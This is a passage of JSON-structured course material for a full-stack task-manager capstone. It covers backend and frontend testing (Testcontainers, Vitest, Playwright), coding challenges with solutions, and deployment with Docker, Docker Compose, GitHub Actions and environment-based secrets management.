TaskStatus.COMPLETED);\n        taskRepository.saveAll(List.of(task1, task2));\n\n        User otherUser = new User();\n        otherUser.setEmail(\"other@example.com\");\n        otherUser.setPassword(\"password\");\n        otherUser.setName(\"Other User\");\n        otherUser = userRepository.save(otherUser);\n\n        Task otherTask = new Task();\n        otherTask.setTitle(\"Other Task\");\n        otherTask.setStatus(TaskStatus.PENDING);\n        otherTask.setPriority(TaskPriority.LOW);\n        otherTask.setUser(otherUser);\n        taskRepository.save(otherTask);\n\n        // Act\n        Page<Task> result = taskRepository.findByUser(testUser, PageRequest.of(0, 10));\n\n        // Assert\n        assertThat(result.getContent()).hasSize(2);\n        assertThat(result.getContent()).allMatch(t -> t.getUser().getId().equals(testUser.getId()));\n    }\n\n    @Test\n    void findByUserAndStatus_FiltersCorrectly() {\n        // Arrange\n        taskRepository.save(createTask(\"Pending 1\", TaskStatus.PENDING));\n        taskRepository.save(createTask(\"Pending 2\", TaskStatus.PENDING));\n        taskRepository.save(createTask(\"Completed\", TaskStatus.COMPLETED));\n\n        // Act\n        Page<Task> pending = taskRepository.findByUserAndStatus(\n            testUser, TaskStatus.PENDING, PageRequest.of(0, 10));\n\n        // Assert\n        assertThat(pending.getContent()).hasSize(2);\n        assertThat(pending.getContent()).allMatch(t -> t.getStatus() == TaskStatus.PENDING);\n    }\n\n    @Test\n    void findByUserAndCategory_FiltersCorrectly() {\n        // Arrange\n        Task workTask = createTask(\"Work Task\", TaskStatus.PENDING);\n        workTask.setCategory(workCategory);\n        taskRepository.save(workTask);\n\n        taskRepository.save(createTask(\"No Category\", TaskStatus.PENDING));\n\n        // Act\n        Page<Task> result = taskRepository.findByUserAndCategory(\n            testUser, workCategory, PageRequest.of(0, 10));\n\n        // Assert\n        assertThat(result.getContent()).hasSize(1);\n        assertThat(result.getContent().get(0).getTitle()).isEqualTo(\"Work Task\");\n    }\n\n    @Test\n    void findOverdueTasks_ReturnsOnlyOverdue() {\n        // Arrange\n        Task overdue = createTask(\"Overdue\", TaskStatus.PENDING);\n        overdue.setDueDate(LocalDate.now().minusDays(1));\n        taskRepository.save(overdue);\n\n        Task future = createTask(\"Future\", TaskStatus.PENDING);\n        future.setDueDate(LocalDate.now().plusDays(1));\n        taskRepository.save(future);\n\n        Task completed = createTask(\"Done\", TaskStatus.COMPLETED);\n        completed.setDueDate(LocalDate.now().minusDays(1));\n        taskRepository.save(completed);\n\n        // Act\n        List<Task> overdueTasks = taskRepository.findOverdueTasks(testUser, LocalDate.now());\n\n        // Assert\n        assertThat(overdueTasks).hasSize(1);\n        assertThat(overdueTasks.get(0).getTitle()).isEqualTo(\"Overdue\");\n    }\n\n    private Task createTask(String title, TaskStatus status) {\n        Task task = new Task();\n        task.setTitle(title);\n        task.setStatus(status);\n        task.setPriority(TaskPriority.MEDIUM);\n        task.setUser(testUser);\n        return task;\n    }\n}\n```\n\nTestcontainers benefits:\n- Real database behavior (not H2 approximations)\n- Automatic container lifecycle management\n- @ServiceConnection auto-configures Spring datasource\n- Works with CI/CD pipelines that support Docker"
            },
            {
              "type": "THEORY",
              "title": "React Component Tests with Vitest and React Testing Library",
              "content": "For the React frontend, we use Vitest (a fast test runner compatible with Vite) and React Testing Library (for component testing that focuses on user behavior).\n\nSetup Vitest:\n```bash\nnpm install -D vitest @testing-library/react @testing-library/jest-dom jsdom\n```\n\nConfigure Vitest (vite.config.js):\n```javascript\nimport { defineConfig } from 'vite'\nimport react from '@vitejs/plugin-react'\n\nexport default defineConfig({\n  plugins: [react()],\n  test: {\n    globals: true,\n    environment: 'jsdom',\n    setupFiles: './src/test/setup.js',\n  },\n})\n```\n\nSetup File (src/test/setup.js):\n```javascript\nimport '@testing-library/jest-dom';\n```\n\nTesting Components:\n\n```jsx\n// src/components/tasks/__tests__/TaskCard.test.jsx\nimport { render, screen, fireEvent } from '@testing-library/react';\nimport { describe, it, expect, vi } from 'vitest';\nimport TaskCard from '../TaskCard';\n\ndescribe('TaskCard', () => {\n  const mockTask = {\n    id: 1,\n    title: 'Test Task',\n    description: 'Task description',\n    status: 'PENDING',\n    priority: 'HIGH',\n    dueDate: '2024-12-31',\n  };\n\n  it('renders task title and status', () => {\n    render(<TaskCard task={mockTask} onEdit={() => {}} onDelete={() => {}} />);\n    \n    expect(screen.getByText('Test Task')).toBeInTheDocument();\n    expect(screen.getByText(/pending/i)).toBeInTheDocument();\n  });\n\n  it('applies priority-based styling', () => {\n    render(<TaskCard task={mockTask} onEdit={() => {}} onDelete={() => {}} />);\n    \n    const card = screen.getByText('Test Task').closest('div');\n    expect(card).toHaveClass('border-orange-500'); // HIGH priority\n  });\n\n  it('shows overdue indicator for past due date', () => {\n    const overdueTask = {\n      ...mockTask,\n      dueDate: '2020-01-01', // Past date\n    };\n    render(<TaskCard task={overdueTask} onEdit={() => {}} onDelete={() => {}} />);\n    \n    expect(screen.getByText(/overdue/i)).toBeInTheDocument();\n  });\n\n  it('calls onEdit when edit button clicked', () => {\n    const handleEdit = vi.fn();\n    render(<TaskCard task={mockTask} onEdit={handleEdit} onDelete={() => {}} />);\n    \n    fireEvent.click(screen.getByText('Edit'));\n    expect(handleEdit).toHaveBeenCalledWith(1);\n  });\n\n  it('calls onDelete when delete button clicked', () => {\n    const handleDelete = vi.fn();\n    render(<TaskCard task={mockTask} onEdit={() => {}} onDelete={handleDelete} />);\n    \n    fireEvent.click(screen.getByText('Delete'));\n    expect(handleDelete).toHaveBeenCalledWith(1);\n  });\n});\n\n// src/components/tasks/__tests__/TaskForm.test.jsx\nimport { render, screen, fireEvent, waitFor } from '@testing-library/react';\nimport { describe, it, expect, vi, beforeEach } from 'vitest';\nimport { BrowserRouter } from 'react-router-dom';\nimport TaskForm from '../TaskForm';\nimport { taskService } from '../../../services/taskService';\n\nvi.mock('../../../services/taskService');\n\nconst renderWithRouter = (component) => {\n  return render(<BrowserRouter>{component}</BrowserRouter>);\n};\n\ndescribe('TaskForm', () => {\n  beforeEach(() => {\n    vi.clearAllMocks();\n  });\n\n  it('renders form fields', () => {\n    renderWithRouter(<TaskForm />);\n    \n    expect(screen.getByLabelText(/title/i)).toBeInTheDocument();\n    expect(screen.getByLabelText(/description/i)).toBeInTheDocument();\n    expect(screen.getByLabelText(/status/i)).toBeInTheDocument();\n    expect(screen.getByLabelText(/priority/i)).toBeInTheDocument();\n  });\n\n  it('shows validation error for empty title', async () => {\n    renderWithRouter(<TaskForm />);\n    \n    fireEvent.click(screen.getByText(/create task/i));\n    \n    await waitFor(() => {\n      expect(screen.getByText(/title is required/i)).toBeInTheDocument();\n    });\n  });\n\n  it('submits form with valid data', async () => {\n    taskService.createTask.mockResolvedValue({ id: 1 });\n    renderWithRouter(<TaskForm />);\n    \n    fireEvent.change(screen.getByLabelText(/title/i), {\n      target: { value: 'New Task' },\n    });\n    fireEvent.click(screen.getByText(/create task/i));\n    \n    await waitFor(() => {\n      expect(taskService.createTask).toHaveBeenCalledWith(\n        expect.objectContaining({ title: 'New Task' })\n      );\n    });\n  });\n\n  it('shows loading state during submission', async () => {\n    taskService.createTask.mockImplementation(\n      () => new Promise(resolve => setTimeout(resolve, 100))\n    );\n    renderWithRouter(<TaskForm />);\n    \n    fireEvent.change(screen.getByLabelText(/title/i), {\n      target: { value: 'New Task' },\n    });\n    fireEvent.click(screen.getByText(/create task/i));\n    \n    expect(screen.getByText(/saving/i)).toBeInTheDocument();\n  });\n});\n```\n\nRun frontend tests: npm test\n\nTesting philosophy:\n- Test behavior, not implementation details\n- Query by accessible elements (role, label, text)\n- Use fireEvent or userEvent for interactions\n- Mock API calls with vi.mock()"
            },
            {
              "type": "THEORY",
              "title": "End-to-End Testing Overview",
              "content": "End-to-end (E2E) tests verify the entire application works together, from browser to database. They simulate real user scenarios.\n\nPopular E2E Testing Tools:\n\n1. Playwright (Recommended)\n- Fast, reliable, modern architecture\n- Cross-browser (Chrome, Firefox, Safari)\n- Excellent debugging with trace viewer\n- Auto-wait for elements\n\n2. Cypress\n- Great developer experience\n- Real-time test preview\n- Time-travel debugging\n- Chrome-based (WebKit support limited)\n\nPlaywright Setup:\n```bash\nnpm init playwright@latest\n```\n\nExample E2E Test (Playwright):\n\n```typescript\n// e2e/tasks.spec.ts\nimport { test, expect } from '@playwright/test';\n\ntest.describe('Task Management', () => {\n  test.beforeEach(async ({ page }) => {\n    // Login before each test\n    await page.goto('/login');\n    await page.fill('[name=\"email\"]', 'test@example.com');\n    await page.fill('[name=\"password\"]', 'password123');\n    await page.click('button[type=\"submit\"]');\n    await page.waitForURL('/dashboard');\n  });\n\n  test('user can create a new task', async ({ page }) => {\n    await page.goto('/tasks/new');\n    \n    await page.fill('[name=\"title\"]', 'E2E Test Task');\n    await page.fill('[name=\"description\"]', 'Created by Playwright');\n    await page.selectOption('[name=\"priority\"]', 'HIGH');\n    await page.click('button[type=\"submit\"]');\n    \n    await page.waitForURL('/tasks');\n    await expect(page.locator('text=E2E Test Task')).toBeVisible();\n  });\n\n  test('user can mark task as complete', async ({ page }) => {\n    await page.goto('/tasks');\n    \n    // Find a task and toggle its status\n    const taskCard = page.locator('.task-card').first();\n    await taskCard.locator('button:has-text(\"Complete\")').click();\n    \n    await expect(taskCard.locator('.status-badge')).toContainText('COMPLETED');\n  });\n\n  test('user can filter tasks by status', async ({ page }) => {\n    await page.goto('/tasks');\n    \n    await page.selectOption('[name=\"status-filter\"]', 'COMPLETED');\n    \n    const tasks = page.locator('.task-card');\n    await expect(tasks).toHaveCount(await tasks.count());\n    \n    for (const task of await tasks.all()) {\n      await expect(task.locator('.status-badge')).toContainText('COMPLETED');\n    }\n  });\n\n  test('user can delete a task', async ({ page }) => {\n    await page.goto('/tasks');\n    \n    const taskCard = page.locator('.task-card').first();\n    const taskTitle = await taskCard.locator('h3').textContent();\n    \n    page.on('dialog', dialog => dialog.accept());\n    await taskCard.locator('button:has-text(\"Delete\")').click();\n    \n    await expect(page.locator(`text=${taskTitle}`)).not.toBeVisible();\n  });\n});\n```\n\nRun E2E tests:\n```bash\nnpx playwright test\nnpx playwright test --ui  # Interactive mode\nnpx playwright show-report  # View results\n```\n\nE2E tests are slower but catch integration issues that unit tests miss. Run them in CI/CD before deployment."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "capstone-16-8-service-test",
              "title": "Write CategoryService Tests",
              "description": "Create unit tests for the CategoryService class.",
              "instructions": "Write tests for CategoryService that cover:\n1. Creating a category successfully\n2. Throwing exception when category name already exists for user\n3. Getting all categories for a user\n4. Deleting a category (and verifying tasks are not deleted, just unlinked)",
              "starterCode": "// src/test/java/com/taskmanager/service/CategoryServiceTest.java\npackage com.taskmanager.service;\n\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.mockito.InjectMocks;\nimport org.mockito.Mock;\nimport org.mockito.junit.jupiter.MockitoExtension;\n\nimport static org.assertj.core.api.Assertions.*;\nimport static org.mockito.Mockito.*;\n\n@ExtendWith(MockitoExtension.class)\nclass CategoryServiceTest {\n    // TODO: Implement tests\n}",
              "solution": "package com.taskmanager.service;\n\nimport com.taskmanager.dto.CategoryRequest;\nimport com.taskmanager.dto.CategoryResponse;\nimport com.taskmanager.entity.Category;\nimport com.taskmanager.entity.User;\nimport com.taskmanager.exception.DuplicateResourceException;\nimport com.taskmanager.exception.ResourceNotFoundException;\nimport com.taskmanager.repository.CategoryRepository;\nimport com.taskmanager.repository.TaskRepository;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.extension.ExtendWith;\nimport org.mockito.InjectMocks;\nimport org.mockito.Mock;\nimport org.mockito.junit.jupiter.MockitoExtension;\n\nimport java.util.List;\nimport java.util.Optional;\n\nimport static org.assertj.core.api.Assertions.*;\nimport static org.mockito.ArgumentMatchers.any;\nimport static org.mockito.Mockito.*;\n\n@ExtendWith(MockitoExtension.class)\nclass CategoryServiceTest {\n\n    @Mock\n    private CategoryRepository categoryRepository;\n\n    @Mock\n    private TaskRepository taskRepository;\n\n    @InjectMocks\n    private CategoryService categoryService;\n\n    private User testUser;\n    private Category testCategory;\n    private CategoryRequest validRequest;\n\n    @BeforeEach\n    void setUp() {\n        testUser = new User();\n        testUser.setId(1L);\n        testUser.setEmail(\"test@example.com\");\n\n        testCategory = new Category();\n        testCategory.setId(1L);\n        testCategory.setName(\"Work\");\n        testCategory.setColor(\"#FF5733\");\n        testCategory.setUser(testUser);\n\n        validRequest = new CategoryRequest();\n        validRequest.setName(\"Work\");\n        validRequest.setColor(\"#FF5733\");\n    }\n\n    @Test\n    @DisplayName(\"createCategory should save and return category\")\n    void createCategory_Success() {\n        when(categoryRepository.existsByNameAndUser(\"Work\", testUser)).thenReturn(false);\n        when(categoryRepository.save(any(Category.class))).thenAnswer(inv -> {\n            Category cat = inv.getArgument(0);\n            cat.setId(1L);\n            return cat;\n        });\n\n        CategoryResponse response = categoryService.createCategory(validRequest, testUser);\n\n        assertThat(response).isNotNull();\n        assertThat(response.getName()).isEqualTo(\"Work\");\n        assertThat(response.getColor()).isEqualTo(\"#FF5733\");\n        verify(categoryRepository).save(any(Category.class));\n    }\n\n    @Test\n    @DisplayName(\"createCategory should throw exception when name exists\")\n    void createCategory_DuplicateName_ThrowsException() {\n        when(categoryRepository.existsByNameAndUser(\"Work\", testUser)).thenReturn(true);\n\n        assertThatThrownBy(() -> categoryService.createCategory(validRequest, testUser))\n            .isInstanceOf(DuplicateResourceException.class)\n            .hasMessageContaining(\"Category with name 'Work' already exists\");\n\n        verify(categoryRepository, never()).save(any());\n    }\n\n    @Test\n    @DisplayName(\"getCategories should return all user categories\")\n    void getCategories_ReturnsUserCategories() {\n        Category cat2 = new Category();\n        cat2.setId(2L);\n        cat2.setName(\"Personal\");\n        cat2.setUser(testUser);\n\n        when(categoryRepository.findByUser(testUser)).thenReturn(List.of(testCategory, cat2));\n\n        List<CategoryResponse> result = categoryService.getCategories(testUser);\n\n        assertThat(result).hasSize(2);\n        assertThat(result).extracting(\"name\").containsExactly(\"Work\", \"Personal\");\n    }\n\n    @Test\n    @DisplayName(\"deleteCategory should unlink tasks and delete category\")\n    void deleteCategory_UnlinksTasks() {\n        when(categoryRepository.findById(1L)).thenReturn(Optional.of(testCategory));\n        doNothing().when(taskRepository).unlinkCategory(testCategory);\n        doNothing().when(categoryRepository).delete(testCategory);\n\n        categoryService.deleteCategory(1L, testUser);\n\n        verify(taskRepository).unlinkCategory(testCategory);\n        verify(categoryRepository).delete(testCategory);\n    }\n\n    @Test\n    @DisplayName(\"deleteCategory should throw exception when not found\")\n    void deleteCategory_NotFound_ThrowsException() {\n        when(categoryRepository.findById(999L)).thenReturn(Optional.empty());\n\n        assertThatThrownBy(() -> categoryService.deleteCategory(999L, testUser))\n            .isInstanceOf(ResourceNotFoundException.class);\n    }\n}",
              "language": "java",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Use when().thenReturn() to set up mock behavior before calling the service method."
                },
                {
                  "level": 2,
                  "text": "For the delete test, verify that taskRepository.unlinkCategory() is called before categoryRepository.delete()."
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-8-react-test",
              "title": "Write TaskFilters Component Tests",
              "description": "Create tests for the TaskFilters component using React Testing Library.",
              "instructions": "Write tests for TaskFilters that verify:\n1. All filter dropdowns (status, priority) are rendered\n2. Search input is rendered\n3. Changing status filter calls onFilterChange with correct value\n4. Typing in search input calls onFilterChange with updated search term",
              "starterCode": "// src/components/tasks/__tests__/TaskFilters.test.jsx\nimport { render, screen, fireEvent } from '@testing-library/react';\nimport { describe, it, expect, vi } from 'vitest';\nimport TaskFilters from '../TaskFilters';\n\ndescribe('TaskFilters', () => {\n  // TODO: Implement tests\n});",
              "solution": "import { render, screen, fireEvent } from '@testing-library/react';\nimport { describe, it, expect, vi } from 'vitest';\nimport TaskFilters from '../TaskFilters';\n\ndescribe('TaskFilters', () => {\n  const defaultFilters = {\n    status: 'ALL',\n    priority: 'ALL',\n    search: '',\n  };\n\n  it('renders status and priority dropdowns', () => {\n    render(<TaskFilters filters={defaultFilters} onFilterChange={() => {}} />);\n    \n    expect(screen.getByLabelText(/status/i)).toBeInTheDocument();\n    expect(screen.getByLabelText(/priority/i)).toBeInTheDocument();\n  });\n\n  it('renders search input', () => {\n    render(<TaskFilters filters={defaultFilters} onFilterChange={() => {}} />);\n    \n    expect(screen.getByPlaceholderText(/search/i)).toBeInTheDocument();\n  });\n\n  it('calls onFilterChange when status changes', () => {\n    const handleChange = vi.fn();\n    render(<TaskFilters filters={defaultFilters} onFilterChange={handleChange} />);\n    \n    fireEvent.change(screen.getByLabelText(/status/i), {\n      target: { value: 'COMPLETED' },\n    });\n    \n    expect(handleChange).toHaveBeenCalledWith({\n      ...defaultFilters,\n      status: 'COMPLETED',\n    });\n  });\n\n  it('calls onFilterChange when priority changes', () => {\n    const handleChange = vi.fn();\n    render(<TaskFilters filters={defaultFilters} onFilterChange={handleChange} />);\n    \n    fireEvent.change(screen.getByLabelText(/priority/i), {\n      target: { value: 'HIGH' },\n    });\n    \n    expect(handleChange).toHaveBeenCalledWith({\n      ...defaultFilters,\n      priority: 'HIGH',\n    });\n  });\n\n  it('calls onFilterChange when search input changes', () => {\n    const handleChange = vi.fn();\n    render(<TaskFilters filters={defaultFilters} onFilterChange={handleChange} />);\n    \n    fireEvent.change(screen.getByPlaceholderText(/search/i), {\n      target: { value: 'urgent' },\n    });\n    \n    expect(handleChange).toHaveBeenCalledWith({\n      ...defaultFilters,\n      search: 'urgent',\n    });\n  });\n\n  it('displays current filter values', () => {\n    const activeFilters = {\n      status: 'PENDING',\n      priority: 'HIGH',\n      search: 'meeting',\n    };\n    render(<TaskFilters filters={activeFilters} onFilterChange={() => {}} />);\n    \n    expect(screen.getByLabelText(/status/i)).toHaveValue('PENDING');\n    expect(screen.getByLabelText(/priority/i)).toHaveValue('HIGH');\n    expect(screen.getByPlaceholderText(/search/i)).toHaveValue('meeting');\n  });\n});",
              "language": "jsx",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Use fireEvent.change() to simulate selecting an option from a dropdown."
                },
                {
                  "level": 2,
                  "text": "Remember that onFilterChange receives the entire filters object, not just the changed value."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "capstone-lesson-9",
          "title": "Lesson 16.9: Deployment to Production",
          "moduleId": "module-16",
          "order": 9,
          "estimatedMinutes": 80,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Multi-Stage Dockerfile for Spring Boot",
              "content": "A multi-stage Dockerfile separates the build environment from the runtime environment, resulting in smaller, more secure production images.\n\nWhy Multi-Stage Builds?\n- Build stage includes JDK, Gradle/Maven, source code (large)\n- Runtime stage only includes JRE and the JAR (small)\n- Final image is 200-300MB instead of 800MB+\n- Reduced attack surface in production\n\n```dockerfile\n# Dockerfile (in project root)\n\n# Stage 1: Build the application\nFROM gradle:8.5-jdk21 AS builder\n\nWORKDIR /app\n\n# Copy only dependency files first (for layer caching)\nCOPY build.gradle settings.gradle ./\nCOPY gradle ./gradle\n\n# Download dependencies (cached if build.gradle unchanged)\nRUN gradle dependencies --no-daemon\n\n# Copy source code\nCOPY src ./src\n\n# Build the application\nRUN gradle build -x test --no-daemon\n\n# Stage 2: Create the runtime image\nFROM eclipse-temurin:21-jre-alpine\n\nWORKDIR /app\n\n# Create non-root user for security\nRUN addgroup -S spring && adduser -S spring -G spring\n\n# Copy the JAR from builder stage\nCOPY --from=builder /app/build/libs/*.jar app.jar\n\n# Set ownership to non-root user\nRUN chown spring:spring app.jar\nUSER spring\n\n# Expose port\nEXPOSE 8080\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=30s \\\n  CMD wget --quiet --tries=1 --spider http://localhost:8080/actuator/health || exit 1\n\n# Run the application\nENTRYPOINT [\"java\", \"-jar\", \"app.jar\"]\n```\n\nFor Maven projects, replace the builder stage:\n```dockerfile\nFROM maven:3.9-eclipse-temurin-21 AS builder\nWORKDIR /app\nCOPY pom.xml .\nRUN mvn dependency:go-offline\nCOPY src ./src\nRUN mvn package -DskipTests\n```\n\nBuild and run locally:\n```bash\n# Build the image\ndocker build -t taskmanager-api:latest .\n\n# Run with environment variables\ndocker run -p 8080:8080 \\\n  -e SPRING_DATASOURCE_URL=jdbc:postgresql://host.docker.internal:5432/taskmanager \\\n  -e SPRING_DATASOURCE_USERNAME=postgres \\\n  -e SPRING_DATASOURCE_PASSWORD=password \\\n  -e JWT_SECRET=your-secret-key \\\n  taskmanager-api:latest\n```\n\nThe alpine base image is just 50MB. Combined with JRE-only (no JDK), your final image stays lean."
            },
            {
              "type": "THEORY",
              "title": "Docker Compose for Full Stack",
              "content": "Docker Compose orchestrates multiple containers, making it easy to run the complete application stack locally or in staging environments.\n\n```yaml\n# docker-compose.yml\nversion: '3.8'\n\nservices:\n  # PostgreSQL Database\n  postgres:\n    image: postgres:15-alpine\n    container_name: taskmanager-db\n    environment:\n      POSTGRES_DB: taskmanager\n      POSTGRES_USER: taskmanager\n      POSTGRES_PASSWORD: ${DB_PASSWORD:-localdev123}\n    volumes:\n      - postgres_data:/var/lib/postgresql/data\n    ports:\n      - \"5432:5432\"\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U taskmanager\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  # Spring Boot Backend\n  api:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    container_name: taskmanager-api\n    depends_on:\n      postgres:\n        condition: service_healthy\n    environment:\n      SPRING_DATASOURCE_URL: jdbc:postgresql://postgres:5432/taskmanager\n      SPRING_DATASOURCE_USERNAME: taskmanager\n      SPRING_DATASOURCE_PASSWORD: ${DB_PASSWORD:-localdev123}\n      SPRING_JPA_HIBERNATE_DDL_AUTO: update\n      JWT_SECRET: ${JWT_SECRET:-dev-secret-key-change-in-production}\n      JWT_EXPIRATION: 86400000\n      CORS_ALLOWED_ORIGINS: http://localhost:5173,http://localhost:3000\n    ports:\n      - \"8080:8080\"\n    healthcheck:\n      test: [\"CMD\", \"wget\", \"--quiet\", \"--tries=1\", \"--spider\", \"http://localhost:8080/actuator/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n      start_period: 40s\n\n  # React Frontend\n  frontend:\n    build:\n      context: ./frontend\n      dockerfile: Dockerfile\n    container_name: taskmanager-frontend\n    depends_on:\n      api:\n        condition: service_healthy\n    environment:\n      VITE_API_URL: http://localhost:8080/api\n    ports:\n      - \"3000:80\"\n\nvolumes:\n  postgres_data:\n```\n\nFrontend Dockerfile (frontend/Dockerfile):\n```dockerfile\n# Stage 1: Build React app\nFROM node:20-alpine AS builder\n\nWORKDIR /app\n\n# Install dependencies\nCOPY package*.json ./\nRUN npm ci\n\n# Copy source and build\nCOPY . .\nRUN npm run build\n\n# Stage 2: Serve with nginx\nFROM nginx:alpine\n\n# Copy built files\nCOPY --from=builder /app/dist /usr/share/nginx/html\n\n# Custom nginx config for SPA routing\nCOPY nginx.conf /etc/nginx/conf.d/default.conf\n\nEXPOSE 80\nCMD [\"nginx\", \"-g\", \"daemon off;\"]\n```\n\nNginx config for SPA (frontend/nginx.conf):\n```nginx\nserver {\n    listen 80;\n    root /usr/share/nginx/html;\n    index index.html;\n\n    # Handle client-side routing\n    location / {\n        try_files $uri $uri/ /index.html;\n    }\n\n    # Proxy API requests to backend\n    location /api {\n        proxy_pass http://api:8080;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n    }\n}\n```\n\nRun the full stack:\n```bash\n# Start all services\ndocker-compose up -d\n\n# View logs\ndocker-compose logs -f\n\n# Stop all services\ndocker-compose down\n\n# Stop and remove volumes (fresh start)\ndocker-compose down -v\n```"
            },
            {
              "type": "THEORY",
              "title": "GitHub Actions CI/CD Pipeline",
              "content": "GitHub Actions automates testing and deployment. Every push triggers tests, and merges to main trigger deployment.\n\nCreate the workflow file:\n```yaml\n# .github/workflows/ci-cd.yml\nname: CI/CD Pipeline\n\non:\n  push:\n    branches: [main, develop]\n  pull_request:\n    branches: [main]\n\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\njobs:\n  # Run tests\n  test:\n    runs-on: ubuntu-latest\n    \n    services:\n      postgres:\n        image: postgres:15\n        env:\n          POSTGRES_DB: testdb\n          POSTGRES_USER: test\n          POSTGRES_PASSWORD: test\n        ports:\n          - 5432:5432\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up JDK 21\n        uses: actions/setup-java@v4\n        with:\n          java-version: '21'\n          distribution: 'temurin'\n          cache: 'gradle'\n\n      - name: Run tests\n        env:\n          SPRING_DATASOURCE_URL: jdbc:postgresql://localhost:5432/testdb\n          SPRING_DATASOURCE_USERNAME: test\n          SPRING_DATASOURCE_PASSWORD: test\n        run: ./gradlew test\n\n      - name: Upload test results\n        uses: actions/upload-artifact@v4\n        if: always()\n        with:\n          name: test-results\n          path: build/reports/tests/\n\n  # Test frontend\n  test-frontend:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: ./frontend\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n          cache-dependency-path: frontend/package-lock.json\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Run tests\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  # Build and push Docker images\n  build:\n    needs: [test, test-frontend]\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n    \n    permissions:\n      contents: read\n      packages: write\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Log in to Container Registry\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Build and push API image\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}-api:latest\n\n      - name: Build and push Frontend image\n        uses: docker/build-push-action@v5\n        with:\n          context: ./frontend\n          push: true\n          tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}-frontend:latest\n\n  # Deploy to Railway\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    if: github.event_name == 'push' && github.ref == 'refs/heads/main'\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install Railway CLI\n        run: npm install -g @railway/cli\n\n      - name: Deploy to Railway\n        env:\n          RAILWAY_TOKEN: ${{ secrets.RAILWAY_TOKEN }}\n        run: railway up --service api\n```\n\nThis pipeline:\n1. Runs backend tests with PostgreSQL service\n2. Runs frontend tests and build\n3. Builds Docker images on main branch\n4. Pushes to GitHub Container Registry\n5. Deploys to Railway\n\nAdd secrets in GitHub repository settings:\n- RAILWAY_TOKEN: Your Railway deployment token"
            },
            {
              "type": "THEORY",
              "title": "Environment Variables and Secrets Management",
              "content": "Never commit secrets to version control. Use environment variables and secret management for all sensitive configuration.\n\nDevelopment vs Production Configuration:\n\n```properties\n# src/main/resources/application.properties\n# Base configuration - no secrets here!\nspring.application.name=taskmanager\nserver.port=8080\n\nspring.jpa.hibernate.ddl-auto=validate\nspring.jpa.show-sql=false\n\n# These come from environment variables\nspring.datasource.url=${DATABASE_URL}\nspring.datasource.username=${DATABASE_USERNAME}\nspring.datasource.password=${DATABASE_PASSWORD}\n\njwt.secret=${JWT_SECRET}\njwt.expiration=${JWT_EXPIRATION:86400000}\n\ncors.allowed-origins=${CORS_ALLOWED_ORIGINS:http://localhost:5173}\n```\n\nLocal Development (.env file - never commit!):\n```bash\n# .env - add to .gitignore!\nDATABASE_URL=jdbc:postgresql://localhost:5432/taskmanager\nDATABASE_USERNAME=postgres\nDATABASE_PASSWORD=localdev123\nJWT_SECRET=local-dev-secret-key-32-chars-min\nJWT_EXPIRATION=86400000\nCORS_ALLOWED_ORIGINS=http://localhost:5173\n```\n\n.gitignore entries:\n```gitignore\n# Environment files\n.env\n.env.local\n.env.*.local\napplication-local.properties\n\n# Secrets\n*.pem\n*.key\nsecrets/\n```\n\nSecure Secret Storage in Production:\n\n1. Railway/Heroku: Add in dashboard under Environment Variables\n\n2. AWS Secrets Manager:\n```java\n@Configuration\npublic class SecretsConfig {\n    @Bean\n    public String jwtSecret(SecretsManagerClient client) {\n        GetSecretValueRequest request = GetSecretValueRequest.builder()\n            .secretId(\"taskmanager/jwt-secret\")\n            .build();\n        return client.getSecretValue(request).secretString();\n    }\n}\n```\n\n3. Kubernetes Secrets:\n```yaml\napiVersion: v1\nkind: Secret\nmetadata:\n  name: taskmanager-secrets\ntype: Opaque\nstringData:\n  jwt-secret: your-production-secret\n  db-password: secure-database-password\n```\n\nSecret Rotation Strategy:\n- JWT secrets: Rotate every 30-90 days\n- Database passwords: Rotate quarterly\n- API keys: Rotate immediately if exposed\n\nAlways assume secrets can be exposed. Use short-lived tokens where possible, and implement secret rotation without downtime."
            },
            {
              "type": "THEORY",
              "title": "Railway Deployment Walkthrough",
